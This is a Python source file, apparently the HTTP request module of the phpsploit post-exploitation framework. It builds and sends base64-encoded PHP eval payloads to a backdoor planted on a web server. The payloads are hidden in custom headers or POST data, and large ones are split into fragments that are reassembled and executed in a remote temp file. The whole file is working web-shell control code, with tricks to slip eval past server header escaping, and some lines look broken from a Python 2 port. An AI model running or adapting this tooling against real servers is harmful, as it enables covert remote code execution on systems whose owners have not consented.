
import sys
import re
import math
import uuid
import time
import base64
import urllib.request
import urllib.parse

import ui.input
import core
from core import session
from datatypes import Path
from ui.color import colorize
import tunnel
from tunnel.exceptions import BuildError, RequestError, ResponseError


class Request:

    # the list of available methods
    methods = ['GET', 'POST']

    # pre-set headers, which might be considered to count vacant headers
    base_headers = ['host', 'accept-encoding', 'connection', 'user-agent']
    post_headers = ['content-type', 'content-length']

    # the parser format string, used to parse/unparse phpsploit data
    parser = '<%SEP%>%s</%SEP%>'

    # a stupid function designed to not exceed the 78 chars limit in the code
    def load_phpfile(filepath):
        file = Path(core.basedir, "data/tunnel", filepath, mode='fr')
        return file.phpcode()

    # specific php code templates which are injected in the main evil
    # header, nominated by the PASSKEY setting, in charge of asessing
    # the main payload (in both POST and HEADER FILLING methods)
    forwarder_template = {'GET': load_phpfile('forwarders/get.php'),
                          'POST': load_phpfile('forwarders/post.php')}

    # on multipart payloads, these different php codes are used as a pipe
    # between header payload and final payload. the starter writes the
    # encoded first part of payload into the self.tmpfile, the sender
    # continues the operation appending middle parts into the tmpfile data;
    # finally, the reader writes the last part, then executes the tmpfile's
    # reassembled content.
    multipart = {'starter': load_phpfile('multipart/starter.php'),
                 'sender': load_phpfile('multipart/sender.php'),
                 'reader': load_phpfile('multipart/reader.php')}

    def __init__(self):
        # customizable variables
        target = session.Conf.TARGET(call=False)
        self.hostname = target.host
        self.target = target()
        self.passkey = session.Conf.PASSKEY()
        self.is_first_payload = False
        self.is_first_request = True

        # default message exceptions on request/response fail
        self.errmsg_request = "Communication with the server impossible"
        self.errmsg_response = "Php runtime error"

        # eventual error produced on build_forwarder()
        self.payload_forwarder_error = None

        # Use the PROXY setting as urllib opener
        self.opener = session.Conf.PROXY()

        # the list of user specified additionnal headers (HTTP_* settings)
        self.set_headers = load_headers(session.Conf)

        # the parser/unparser are used to truncate phpsploit
        # data from the received http response.
        self.parser = self.parser.replace('%SEP%', str(uuid.uuid4()))
        self.unparser = re.compile(self.parser % '(.+?)', re.S)

        # try to get a tmpdir, which acts as recipient directory on payloads
        # sent via multiple requests, if no writeable tmpdir is known, the
        # user will be asked to manually determine a writeable directory
        # on the self.load_multipart() function.
        self.tmpfile = '/' + str(uuid.uuid4())
        if "WRITE_TMPDIR" in session.Env.keys():
            self.tmpdir = session.Conf["WRITE_TMPDIR"] + self.tmpfile
        else:
            self.tmpdir = None

        # multipart_file is a small portion of php code in the form:
        # <? $f = "/tmp/dir" ?>, that indicates to multipart payloads
        # where the fragments of payload will be written.
        # the self.load_multipart() function sets it.
        self.multipart_file = None

        # the list of formated REQ_* Settings, for use in the http sender.
        hdr_payload = session.Conf.REQ_HEADER_PAYLOAD()
        hdr_payload = hdr_payload.replace('%%BASE64%%', '%s')
        self.header_payload = hdr_payload.rstrip(';') + ';'

        self.default_method = session.Conf.REQ_DEFAULT_METHOD()
        self.zlib_try_limit = session.Conf.REQ_ZLIB_TRY_LIMIT()
        self.max_post_size = session.Conf.REQ_MAX_POST_SIZE()
        self.max_header_size = session.Conf.REQ_MAX_HEADER_SIZE()
        self.max_headers = session.Conf.REQ_MAX_HEADERS()

        # determine how much header slots are really vacants, to calculate
        # what payload types will be available, and how much data can be
        # sent by http request.
        vacant_hdrs = (self.max_headers -
                       len(self.base_headers) -
                       len(self.set_headers.keys()) -
                       1)  # the payload forwarder header

        self.vacant_headers = {'GET': vacant_hdrs,
                               'POST': vacant_hdrs - len(self.post_headers)}

        # GET's max size gets -8 because payloaded headers are sent like this:
        #   `ZZAA: DATA\r\n`, aka 8 chars more than DATA.
        # POST's max size gets -5 because a POST data is sent like this:
        #   `PASSKEY=DATA\r\n\r\n`, so = and \r\n\r\n must be considered too.
        self.maxsize = {'GET':  vacant_hdrs * (self.max_header_size - 8),
                        'POST': self.max_post_size - len(self.passkey) - 5}

        # the self.can_send var is a dic of bools, 1 per available http method
        # which indicate if yes or no the concerned method can be really used.
        self.can_send = {'GET':  [self.maxsize['GET'] > 0],
                         'POST': False}
        if self.maxsize['POST'] > 0 and self.vacant_headers['POST'] >= 0:
            self.can_send['POST'] = True

    def other_method(self):
        """returns the inverse of the current default method"""

        if self.default_method == 'GET':
            return 'POST'
        return 'GET'

    def can_add_headers(self, headers):
        """check if the size of the specified headers list
        is in conformity with the max header size

        """
        headers = get_headers(headers)
        for name, value in headers.items():
            rawHeader = '%s: %s\r\n' % (name, value)
            if len(rawHeader) > self.max_header_size:
                return False
        return True

    def encapsulate(self, payload):
        """encapsulate the php unencoded payload with the parser strings"""

        payload = payload.rstrip(';')
        outset, ending = [('echo "%s";' % x) for x in self.parser.split('%s')]
        return (outset + payload + ending)

    def decapsulate(self, response):
        """parse the http response and return the phpsploit data response"""

        response = response.read()
        try:
            return re.findall(self.unparser, response)[0]
        except:
            return None

    def load_multipart(self):
        """enable the multi-request payload capability.
        - query user to determine a remote writeable directory if
        the phpsploit's remote shell opener failed to find one.
        - determine the multipart_file, which is a php code prepended
        to multipart http request, indicating in what remote file
        payload fragments must be written.

        """

        ask_dir = ui.input.Expect(case_sensitive=False, append_choices=False)
        ask_dir.default = "/tmp"
        ask_dir.question = ("Writeable remote directory needed"
                            " to send multipart payload [/tmp]")
        confirm = ui.input.Expect(True)
        while not self.tmpdir:
            response = ask_dir()
            if confirm("Use '%s' as writeable directory ?" % response):
                self.tmpdir = response + self.tmpfile

        if not self.multipart_file:
            self.multipart_file = tunnel.payload.py2php(self.tmpdir)
            self.multipart_file = "$f=%s;" % self.multipart_file
            multipart = dict()
            for name, phpval in self.multipart.items():
                multipart[name] = self.multipart_file + phpval
                if name in ['starter', 'sender']:
                    multipart[name] = self.encapsulate(multipart[name])
            self.multipart = multipart

    def build_forwarder(self, method, decoder):
        """build the effective payload forwarder, which is in fact
        a header using the PASSKEY setting as name.
        The payload forwarder is called by the remote backdoor, and then
        formats the final payload if necessary before executing it.

        """
        decoder = decoder % "$x"
        template = self.forwarder_template[method]
        template = template.replace('%%PASSKEY%%', self.passkey)

        rawForwarder = template % decoder
        b64Forwarder = base64.b64encode(rawForwarder)
        # here we delete the ending "=" from base64 payload
        # because if the string is not enquoted it will not be
        # evaluated. on iis6, apache2, php>=4.4 it dont seem
        # to return error, and is a hacky solution to eval a payload
        # without quotes, preventing header quote escape by server
        # eg: "eval(base64_decode(89jjLKJnj))"
        b64Forwarder = b64Forwarder.rstrip('=')

        hdr_payload = self.header_payload
        forwarder = hdr_payload % b64Forwarder

        if not self.is_first_payload:
            # if the currently built request is not the first http query
            # sent to the server, it means that it works as it is. Therefore,
            # additionnal payload warnings and verifications are useless.
            return forwarder

        err = None
        # if the base64 payload is not enquoted by REQ_HEADER_PAYLOAD
        # setting and contains non alpha numeric chars (aka + or /),
        # then warn the user in case of bad http response.
        if "'%s'" not in hdr_payload and \
           '"%s"' not in hdr_payload and \
           not b64Forwarder.isalnum():
            # create a visible sample of the effective b64 payload
            oneThirdLen = float(len(forwarder / 3))
            oneThirdLen = int(round(oneThirdLen + 0.5))
            sampleSeparator = colorize("%Reset", "\n[*]", "%Cyan")
            lineList = [''] + split_len(forwarder, oneThirdLen)
            showForwarder = sampleSeparator.join(lineList)
            # set the payload forwarder error
            err = ("[*] do not enquotes the base64 payload which"
                   " contains non alpha numeric chars (+ or /),"
                   " blocking execution:" + showForwarder)

        # if the current request is not concerned by the previous case
        # an other kind of error may happen because the contents of
        # the header that forwards the payload contains quotes.
        elif '"' in hdr_payload or \
             "'" in hdr_payload:
            err = ("[*] contains quotes, and some http servers "
                   "defaultly act escaping them in request headers.")

        self.payload_forwarder_error = err
        return forwarder

    def build_get_headers(self, payload):
        """this function takes the main payload data as argument
        and returns a list of filled headers designed to be gathered
        and executed by the payload forwarder.
        Each header name is generated appending two alphabecital letters
        to the base name (aka ZZ).
        Example of headers list: ZZAA, ZZAB, ZZAC, ..., ZZBA, ZZBB, ZZBC,...

        """
        def get_header_names(num):
            letters = 'abcdefghijklmnopqrstuvwxyz'
            result = list()
            base = 0
            for x in range(num):
                x -= 26 * base
                try:
                    char = letters[x]
                except:
                    base += 1
                    char = letters[x-26]
                headerName = "zz" + letters[base] + char
                result.append(headerName)
            return result

        # considering that the default REQ_MAX_HEADERS and REQ_MAX_HEADER_SIZE
        # values can be greater than the real current server's capacity, the
        # following lines equilibrates the risks we take on both settings.
        # The -8 on the max_header_size keeps space for header name and \r\n
        dataLen = len(payload)
        freeSpacePerHdr = self.max_header_size - 8
        vacantHdrs = self.vacant_headers['GET']

        sizePerHdr = math.sqrt((dataLen * freeSpacePerHdr) / vacantHdrs)
        sizePerHdr = int(math.ceil(sizePerHdr))

        hdrDatas = split_len(payload, sizePerHdr)
        hdrNames = get_header_names(len(hdrDatas))
        headers = dict(zip(hdrNames, hdrDatas))
        return headers

    def build_post_content(self, data):
        """returns a POST formated version of the given
        payload data with PASSKEY as variable name

        """
        post_data = {self.passkey: data}
        return urllib.parse.urlencode(post_data)

    def build_single_request(self, method, payload):
        """build a single request from the given http method and
        payload, and return a request object.
        for infos about the return format, see the build_request() docstring.

        """
        # the header that acts as payload forwarder
        forwarder = self.build_forwarder(method, payload.decoder)

        headers = {self.passkey: forwarder}  # headers dictionnary
        content = None  # post data content, None on GET requests

        if not self.can_add_headers(headers):
            # if no more headers are available, the payload forwarder
            # can't be send, so we have to return an empty list
            return []
        if method == 'GET':
            # add built headers containing splitted main payload
            evil_headers = self.build_get_headers(payload.data)
            headers.update(evil_headers)
        if method == 'POST':
            # encode the main paylod as a POST data variable
            content = self.build_post_content(payload.data)

        return [(headers, content)]

    def build_multipart_request(self, method, payload):
        """build a multipart request object from the given http method
        and payload, and return it.
        for infos about the return format, see the build_request() docstring.

        """
        compression = 'auto'
        if payload.length > self.zlib_try_limit:
            compression = 'nocompress'

        def encode(forwarder, payload):
            """insert the payload data in the forwarder and encode
            it with the phpcode.payload.Encode() class.

            """
            data = forwarder.replace('DATA', payload)
            encodedPayload = tunnel.payload.Encode(data, compression)
            return encodedPayload

        lastForwarder = self.multipart['reader'] % (payload.decoder % "$x")

        rawData = payload.data
        baseNum = self.maxsize[method]
        maxFlaw = max(100, (self.maxsize[method] / 100))

        builtReqLst = list()

        # loop while the payload has not been fully distributed into requests
        while True:
            # the multipart forwarder to use on currently built request
            forwarder = 'sender' if len(builtReqLst) else 'starter'
            forwarder = self.multipart[forwarder]

            reqDone = False  # bool True when current req has been calculated
            payload = None  # the current request's payload object

            # the following loop is designed to determine the greatest
            # usable payload that can be used in a single request.
            # on these steps, minRange and maxRange respectively represent
            # the current allowed size's range limits. while testSize
            # represent the currently checked payload size.
            testSize = baseNum
            minRange = maxFlaw
            maxRange = 0
            while not reqDone:
                if maxRange > 0:
                    if maxRange <= minRange:
                        maxRange = minRange * 2
                    # set testSize to the current range's average
                    testSize = minRange + ((maxRange - minRange) / 2)

                # try to build a payload containing the testSize data
                testPayload = encode(forwarder, rawData[:testSize])

                # if it is too big, consider testSize as the new maxRange
                # only if testSize if bigger than the maxFlaw, else return err
                if testPayload.length > self.maxsize[method]:
                    if testSize <= maxFlaw:
                        return []
                    maxRange = testSize

                # if the payload is not too big
                else:
                    # then accept it as current request's payload size, only
                    # if the difference between current size and known limit
                    # does not exceeds the maxFlaw. also accept it if this is
                    # the last built single request.
                    if testSize-minRange <= maxFlaw \
                       or (len(builtReqLst) and testSize == baseNum):
                        payload = testPayload
                        baseNum = testSize
                        reqDone = True
                    # we also now know that the max theorical size is bigger
                    # than tested size, so we settle minRange to it's value
                    minRange = testSize

            # our single request can now be added to the multi req list
            # and it's treated data removed from the full data set
            rawData = rawData[minRange:]
            request = self.build_single_request(method, payload)
            if not request:
                return []
            builtReqLst += request

            # after each successful added request, try to put all remaining
            # data into a final request, and return full result if it enters.
            payload = encode(lastForwarder, rawData)
            if payload.length <= self.maxsize[method]:
                request = self.build_single_request(method, payload)
                if not request:
                    return []
                builtReqLst += request
                return builtReqLst

    def build_request(self, mode, method, payload):
        """a frontend to the build_${mode}_request() functions.
        it takes request mode (single/multipart) as first argument, while
        the 2nd and 3rd are common request builder's arguments.

        * RETURN-FORMAT: the request builders return format is a list()
        containing one tuple per request. Each request tuple contains
        the headers dict() as first element, and the POST data as 2nd elem,
        which is a dict(), or None if there is no POST data to send.
        headers dict() is in the form: {'1stHdrName': '1stHdrValue', ...}
        * This is a basic request format:
            [  ( {"User-Agent":"firefox", {"Accept":"plain"}, None ),
               ( {"User-Agent":"ie"}, {"PostVarName":"PostDATA"} )    ]

        """
        funcName = "build_%s_request" % mode
        try:
            customBuilder = getattr(self, funcName)
        except:
            request = list()
        request = customBuilder(method, payload)
        return request

    def send_single_request(self, request):
        """send a single request object element (a request object's single
        tuple, in the form mentionned in the build_request() docstring.
        A response dict() will be returned, with 'error' and 'data' keys.

        """
        response = {'error': None, 'data': None}  # preset response values
        headers, content = request  # retrieve request elems from given tuple

        # add the user settings specified headers, and get their real values.
        headers.update(self.set_headers)
        headers = get_headers(headers)

        # erect the final request structure
        request = urllib.request.Request(self.target, content, headers)
        try:
            # send request with custom opener and decapsulate it's response
            resp = self.opener.open(request)
            response['data'] = self.decapsulate(resp)
            # if it works, then self.is_first_request bool() is no more True
            self.is_first_request = False

        # treat errors if request failed
        except urllib.error.HTTPError as e:
            response['data'] = self.decapsulate(e)
            if response['data'] is None:
                response['error'] = str(e)
        except urllib.error.URLError as e:
            err = str(e)
            if err.startswith('<urlopen error '):
                err = err[15:-1]
                if err.startswith('[Errno '):
                    err = err[(err.find(']') + 2):]
                err = 'Request error: ' + err
            response['error'] = err
        except KeyboardInterrupt:
            response['error'] = 'HTTP Request interrupted'
        except:
            etype = str(sys.exc_info()[0])
            etype = etype[(etype.find("'") + 1):-2]
            evalue = str(sys.exc_info()[1])
            response['error'] = 'Unexpected error %s : %s' % (etype, evalue)

        return response

    def get_php_errors(self, data):
        """function designed to parse php errors from phpsploit response
        for better output and plugin debugging purposes.
        Its is called by the Read() function and returns the $error string

        """
        error = ''
        data = data.replace('<br />', '\n')  # html NewLines to Ascii
        # get a list of non-empty data lines
        lines = list()
        for line in data.split('\n'):
            line = line.strip()
            if line:
                lines.append(line)
        # extract errors from data
        for line in lines:
            # this condition basically considers current line as a php error
            if line.count(': ') > 1 and ' on line ' in line:
                line = re.sub(' \[<a.*?a>\]', '', line)  # remove html link tag
                line = re.sub('<.*?>', '', line)  # remove other html tags
                line = line.replace(':  ', ': ')  # format double spaces
                line = ' in '.join(line.split(' in ')[0:-1])  # del line info
                error += 'PHP Error: %s\n' % line  # add erro line to return
        return error.strip()

    def read(self):
        """read the http response"""
        return self.response

    def open(self, payload):
        """open a request to the server with the given php payload
        It respectively calls the Build(), Send() and Read() methods.
        if one of these methods returns a string, it will be considered as
        an error, so execution will stop, and self.error will be filled.
        If no errors occur, then the self.response is filled, and the
        response may be obtained by the read() method.

        """
        self.response = None
        self.response_error = None

        def display_warnings(obj):
            if type(obj).__name__ == 'str':
                for line in obj.splitlines():
                    if line:
                        print("\r[-] %s" % line)
                return True
            return False

        # raises BuildError if it fails
        request = self.Build(payload)

        response = self.Send(request)
        if display_warnings(response):
            raise RequestError(self.errmsg_request)

        readed = self.Read(response)
        if display_warnings(readed):
            raise ResponseError(self.errmsg_response)

    def Build(self, payload):
        """Main request Builder:

        if takes the basic php payload as argument,
        and returns the apropriate request object.

        """
        # decline conflicting passkey strings
        if self.passkey.lower().replace('_', '-') in self.set_headers:
            raise BuildError('PASSKEY conflicts with an http header')

        # decline if an user set header do not match size limits
        if not self.can_add_headers(self.set_headers):
            raise BuildError('An http header is longer '
                             'than REQ_MAX_HEADER_SIZE')

        # format the current php payload whith the dedicated Build() method.
        tunnel.payload.Build(payload, self.parser)

        # get a dict of available modes by method
        mode = {}
        for m in self.methods:
            mode[m] = ''
            if self.can_send[m]:
                mode[m] = 'single'
                if payload.length > self.maxsize[m]:
                    mode[m] = 'multipart'

        # if REQ_DEFAULT_METHOD setting is enough for single mode, build now !
        if mode[self.default_method] == 'single':
            req = self.build_request('single', self.default_method, payload)
            if not req:
                raise BuildError('The forwarder is bigger '
                                 'than REQ_MAX_HEADER_SIZE')
            return req

        # load the multipart module if required
        if 'multipart' in mode.values():
            try:
                print('[*] Large payload: %s bytes' % payload.length)
                self.load_multipart()
            except:
                print('')
                raise BuildError('Payload construction aborted')

        # build both methods necessary requests
        request = dict()
        for m in self.methods:
            sys.stdout.write('\rBuilding %s method...\r' % m)
            sys.stdout.flush()
            try:
                request[m] = self.build_request(mode[m], m, payload)
            except:
                raise BuildError('Payload construction aborted')

        # if the default method can't be built, use the other as default
        if not request[self.default_method]:
            self.default_method = self.other_method()
        # but if even the other also cannot be built, then leave with error
        if not request[self.default_method]:
            raise BuildError('REQ_* settings are too small')

        # give user choice for what method to use
        self.choices = list()

        def choice(seq):
            """add arg to the choices list, and enlight it's output"""
            self.choices.append(seq[0].upper())
            hilightChar = colorize("%Bold", seq[0])
            output = '[%s]%s' % (hilightChar, seq[1:])
            return output

        # prepare user query for default method
        query = "[*] %s %s request%s will be sent, you also can " \
                % (len(request[self.default_method]),
                   choice(self.default_method),
                   ['', 's'][len(request[self.default_method]) > 1])
        end = "%s" % choice('Abort')

        # add other method to user query if available
        if request[self.other_method()]:
            query += "send %s %s request%s or " \
                     % (len(request[self.other_method()]),
                        choice(self.other_method()),
                        ['', 's'][len(request[self.other_method()]) > 1])
        # or report that the other method has been disabled
        else:
            print('[-] %s method disabled:' % self.other_method +
                  ' The REQ_* settings are too restrictive')

        query += end + ': '  # add the Abort choice
        self.choices.append(None)  # it makes sure the list length is >= 3

        # loop for user input choice:
        chosen = ''
        while not chosen:
            try:
                chosen = ui.input.Expect(None)(query).upper()
            except:
                print('')
                raise BuildError('Request construction aborted')
            # if no choice consider 1st choice
            if not chosen.strip():
                chosen = self.choices[0]
            # if 1st choice, use default method
            if chosen == self.choices[0]:
                return request[self.default_method]
            # if 3rd choice, use other method
            if chosen == self.choices[2]:
                return request[self.other_method()]
            # if 2nd choice, abort
            if chosen == self.choices[1]:
                raise BuildError('Request construction aborted')
            # else...
            else:
                raise BuildError('Invalid user choice')

    def Send(self, request):
        """Main request Sender:

        if takes the concerned request object as argument
        and returns the unparsed and decapsulated phpsploit response

        """
        multiReqLst = request[:-1]
        lastRequest = request[-1]

        def updateStatus(curReqNum):
            curReqNum += 1  # don't belive the fact that humans count from 1 !
            numOfReqs = str(len(multiReqLst) + 1)
            curReqNum = str(curReqNum).zfill(len(numOfReqs))
            statusMsg = "Sending request %s of %s" % (curReqNum, numOfReqs)
            sys.stdout.write('\r[*] %s' % statusMsg)
            sys.stdout.flush()

        # considering that the multiReqLst can be empty, is means that the
        # following loop is only executer on multipart payloads.
        for curReqNum in range(len(multiReqLst)):
            multiReqError = ('Send Error: Multipart transfer interrupted\n'
                             'The remote temporary payload «%s» must be '
                             'manually removed.' % self.tmpdir)
            sent = False
            while not sent:
                updateStatus(curReqNum)
                response = self.send_single_request(multiReqLst[curReqNum])
                error = response['error']
                # keyboard interrupt imediately leave with error
                if error == 'HTTP Request interrupted':
                    return multiReqError
                # on multipart reqs, all except last MUST return the string 1
                if not error and response['data'] != '1':
                    error = 'Execution error'

                # if the current request failed
                if error:
                    msg = "(Press Enter or wait 1 minut for the next try)"
                    sys.stdout.write(colorize("\n[-] ", error, "%White", msg))
                    ui.input.Expect(None, timeout=60)()
                # if the request has been corretly executed, wait the
                # REQ_INTERVAL setting, and then go to the next request
                else:
                    try:
                        time.sleep(session.Conf.REQ_INTERVAL())
                    except:
                        return multiReqError
                    sent = True

        # if it was a multipart payload, print status for last request
        if len(multiReqLst):
            updateStatus(len(multiReqLst))
            print('')

        # treat the last or single request
        response = self.send_single_request(lastRequest)
        if response['error']:
            return response['error']
        return response

    def Read(self, response):
        """Main request Reader:

        if takes the http response data as argument
        and writes the __RESULT__'s php data into the self.response string,
        and writes the __ERROR__'s php error method to self.response_error.

        Note: The php __ERROR__ container is not a real error, but a
              phpsploit built method to allow plugins returning plugin
              error strings that can be differenciated from base result.

        """
        if response['data'] is None:
            # if no data and error, return it's string
            if response['error']:
                return response['error']
            # elif no data, nothing can be parsed
            print("[-] Server response coudn't be unparsed")
            # print payload forwarder error (if any)
            if self.payload_forwarder_error:
                print("[*] If you are sure that the target is anyway "
                      "infected, this error may be occured because the "
                      "REQ_HEADER_PAYLOAD\n" + self.payload_forwarder_error)
            return ''

        # anyway, some data has been received at this point
        response = response['data']
        # try to decode it, optional because php encoding can be unset
        try:
            response = response.decode('zlib')
        except:
            pass

        # convert the response data into python variable
        try:
            response = tunnel.payload.php2py(response)
        except:
            phpErrors = self.get_php_errors(response)
            if phpErrors:
                return phpErrors
            else:
                raise ResponseError("Server response couldn't be unserialized")

        # check that the received type is a dict
        if type(response).__name__ != 'dict':
            raise ResponseError('Decoded response is not a dict()')
        # then check it is in the good format,
        # aka {'__RESULT__':'DATA'} OR {'__ERROR__':'ERR'}
        if response.keys() == ['__RESULT__']:
            self.response = response['__RESULT__']
        elif response.keys() == ['__ERROR__']:
            self.response_error = response['__ERROR__']
        else:
            raise ResponseError('Returned dict() is in a wrong format')


# split_len('phpsploit', 2) -> ['ph', 'ps', 'pl', 'oi', 't']
def split_len(string, length):
    """split the given string into a list() object which contains
    a list of string sequences or 'length' size.
    Example: split_len('phpsploit', 2) -> ['ph', 'ps', 'pl', 'oi', 't']
    """
    result = list()
    for pos in range(0, len(string), length):
        end = pos + length
        newElem = string[pos:end]
        result.append(newElem)
    return result


def load_headers(settings):
    """load http headers specified as user settings, aka
    variable whose names start with HTTP_.

    it is used to get the list of user specified headers,
    with their names for http filling computing. it do not
    loads dynamic file:// objects, for this, take a look at
    the get_headers() fonction.

    """
    headers = dict()
    # the default user-agent string (empty here)
    headers['user-agent'] = ''

    for key, val in settings.items():
        if key.startswith('HTTP_') and key[5:]:
            key = key[5:].lower().replace('_', '-')
            headers[key] = val
    return headers


def get_headers(headers):
    """this function must be used just before each unicast
    http request, because it formats eventual dynamic user
    specified header values, such as random line values.

    """
    for key, val in headers.items():
        if hasattr(val, "__call__"):
            headers[key] = val()
    return headers
